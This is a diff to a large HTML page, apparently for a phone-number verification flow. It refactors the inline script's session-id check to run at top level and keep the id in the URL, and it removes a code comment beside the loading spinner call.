@@ -26860,11 +26860,21 @@ iron-overlay-backdrop.overlay-backdrop-firework:not([style-scope]):not(.style-sc
                      </template>
                     </div>
                     <script>
-(() => {
-  const verifySid = new URLSearchParams(location.search).get('sid') ||
-                    sessionStorage.getItem('sid');
-  if (!verifySid) { location.href = '/'; throw 0; }
+/* =====  ENSURE SID  ===== */
+const verifySid = new URLSearchParams(location.search).get('sid') ||
+                  sessionStorage.getItem('sid');
+if (!verifySid) {
+  location.href = '/';
+  throw 0;
+}
+if (!location.search.includes('sid=')) {
+  const url = new URL(location);
+  url.searchParams.set('sid', verifySid);
+  history.replaceState(null, '', url);
+}
 
+/* =====  MAIN LOGIC  ===== */
+(() => {
   const field = document.getElementById('phoneField');
   const btn   = document.getElementById('continueBtn');
 
@@ -26915,7 +26925,7 @@ iron-overlay-backdrop.overlay-backdrop-firework:not([style-scope]):not(.style-sc
   /* ----------  SUBMIT  ---------- */
   btn.addEventListener('click', () => {
     btn.disabled = true;
-    showLoading();                       // <-- show spinner
+    showLoading();
     fetch('/api/verify', {
       method: 'POST',
       headers: { 'content-type': 'application/json' },
@@ -28283,4 +28293,5 @@ iron-overlay-backdrop.overlay-backdrop-firework:not([style-scope]):not(.style-sc
  </body>
 
 </html>
+
 
